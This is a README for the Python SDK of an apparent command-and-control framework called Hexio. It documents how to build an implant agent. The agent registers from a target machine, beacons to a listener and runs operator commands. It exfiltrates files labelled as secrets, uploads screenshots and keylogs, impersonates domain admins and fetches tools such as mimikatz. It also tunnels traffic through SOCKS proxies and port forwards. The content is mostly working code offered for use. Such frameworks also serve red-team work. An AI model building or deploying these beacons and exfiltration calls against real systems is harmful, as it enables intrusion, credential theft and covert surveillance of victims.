# Hexio External Agent SDK for Python

A zero-dependency Python client for the Hexio External Agent REST API. Uses only the Python standard library.

## Installation

```bash
# From the SDK directory
cd ExternalAgentSDK/python
pip install .

# Or install in development mode
pip install -e .
```

## Quick Start

```python
import time
from hexio_sdk import HexioClient

# Connect to the External Agent listener
client = HexioClient("http://10.0.0.1:9000", "my-passphrase")

# Register the agent
reg = client.register(
    hostname="TARGET-PC",
    ip="10.0.0.50",
    user="admin",
    os_info="Ubuntu 22.04",
    process="python3",
    pid=1234,
    client_type="my_python_agent",
    sleep_time=5,
)
print(f"Registered as agent {reg['agent_id']}")
# client.token is automatically set

# Main beacon loop
while True:
    checkin = client.checkin()

    for cmd in checkin["commands"]:
        # Execute command locally
        output = execute_command(cmd["command"])

        # Report result
        client.command_response(cmd["id"], cmd["command"], output)

    time.sleep(5)
```

## API Reference

### Client Creation

```python
client = HexioClient(base_url, passphrase)
```

### Registration

```python
resp = client.register(
    hostname="PC-01",
    ip="10.0.0.50",
    user="admin",
    os_info="Windows 10",
    process="agent.exe",
    pid=1234,
    client_type="my_agent",
    sleep_time=5,
)
# resp["agent_id"], resp["token"]
# client.token and client.agent_id are set automatically
```

### Checkin / Sync

```python
# Simple heartbeat
checkin = client.checkin()

# Full sync with sleep update
checkin = client.sync(sleep_time=10, sleep_jitter=3)
```

### Command Response

```python
client.command_response(
    command_id=42,
    command="whoami",
    response="nt authority\\system"
)
```

### File Downloads (Exfiltration)

```python
# Convenience method - handles chunking automatically
with open("/tmp/secrets.db", "rb") as f:
    data = f.read()
download_id = client.download_file("/tmp/secrets.db", data, chunk_size=65536)

# Or manually control chunking
init = client.download_init("secrets.db", "/tmp/secrets.db", file_size, chunk_size, total_chunks)
client.download_chunk(init["download_id"], chunk_bytes)
client.download_cancel(download_id)
```

### Screenshots and Keylogs

```python
# Screenshot (pass raw image bytes)
with open("screenshot.png", "rb") as f:
    client.screenshot("screenshot.png", f.read())

# Keylog
client.keylog("keys.txt", "captured keystroke data")
```

### Impersonation

```python
client.set_impersonation("DOMAIN\\Admin")
client.clear_impersonation()
```

### Side Channels

```python
import base64
client.sidechannel("shell-session-1", base64.b64encode(output).decode())
```

### File Requests

```python
files = client.request_files(
    bof_files=["whoami.o"],
    pe_files=["mimikatz.exe"],
)
# files["bof_files"]["whoami.o"] contains base64 data
```

### SOCKS Proxy

```python
resp = client.socks_open(port=1080)   # specific port
resp = client.socks_open()             # auto-assign
client.socks_close()
resp = client.socks_sync(inbound_data)
```

### Port Forwarding

```python
client.portfwd_open(port=8080, remote_host="10.0.0.5", remote_port=3389)
client.portfwd_close(port=8080)
resp = client.portfwd_sync(sync_entries)
```

## Error Handling

```python
from hexio_sdk import HexioClient, HexioAPIError

client = HexioClient("http://10.0.0.1:9000", "passphrase")

try:
    client.register(...)
except HexioAPIError as e:
    print(f"API error {e.status_code}: {e.message}")
```

## Building as Connector

A typical connector sits between your custom transport and the Hexio listener:

```python
from hexio_sdk import HexioClient
import your_transport

client = HexioClient("http://10.0.0.1:9000", "passphrase")

# Agent registers through your transport
def handle_agent_register(agent_data):
    return client.register(**agent_data)

# Agent checks in through your transport
def handle_agent_checkin(token):
    client.token = token
    return client.checkin()

# Your transport server
server = your_transport.Server()
server.on("register", handle_agent_register)
server.on("checkin", handle_agent_checkin)
server.start()
```
